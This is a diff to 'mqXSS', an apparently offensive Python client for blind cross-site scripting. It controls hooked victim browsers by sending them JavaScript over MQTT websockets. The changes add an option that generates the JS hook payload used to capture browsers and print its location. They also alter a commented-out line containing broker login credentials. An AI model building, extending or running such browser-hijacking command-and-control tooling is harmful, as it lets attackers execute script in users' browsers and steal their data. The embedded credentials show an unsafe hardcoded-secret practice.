@@ -2,6 +2,7 @@
 #mqxss client, send javascript commands to hooked browsers over mqtt wss connections
 import paho.mqtt.client as mqtt
 import sessions
+import generate
 import sys
 import os
 import sqlite3
@@ -24,6 +25,7 @@ parser = argparse.ArgumentParser(description="mqXSS: blind XSS client using webs
 parser.add_argument("-b", dest="broker", required=True, help="Broker domain name")
 parser.add_argument("-p", dest="bport", required=True, help="Broker port")
 parser.add_argument("-t", dest="btopic", required=True, help="Base topic")
+parser.add_argument("-g", dest="generate", required=False, help="Generate JS file to hook browsers with", action="store_true")
 parser.add_argument("-po", dest="push", required=False, help="Send hooked browser responses to pushover", action="store_true")
 parser.add_argument("-js", dest="js", required=False, help="Send javascript to hooked browsers")
 
@@ -35,6 +37,7 @@ if len(sys.argv)==1:
 mbroker = args.broker
 mport = args.bport
 mtopic = args.btopic
+gen = args.generate
 ppush = args.push
 jsarg = args.js
 # banner
@@ -188,6 +191,9 @@ if __name__ == "__main__":
 	client.message_callback_add(topic_out,on_message)
 	client.message_callback_add(topic_rdy,on_rdy)
 	client.on_connect = on_connect
-	#client.username_pw_set(username="flagrantmarshmallow",password="rickjame$bitchezzz")
+	#client.username_pw_set(username="flagrantmarshmallow",password="rickjame$")
+	if gen:
+		generate.ws(mbroker, mport, mtopic)
+		print("[[grey82]mqXSS[/grey82]] JS payload created at "+generate.ws.barbosa)
 	tmqtt.start()
 	sjs.start()
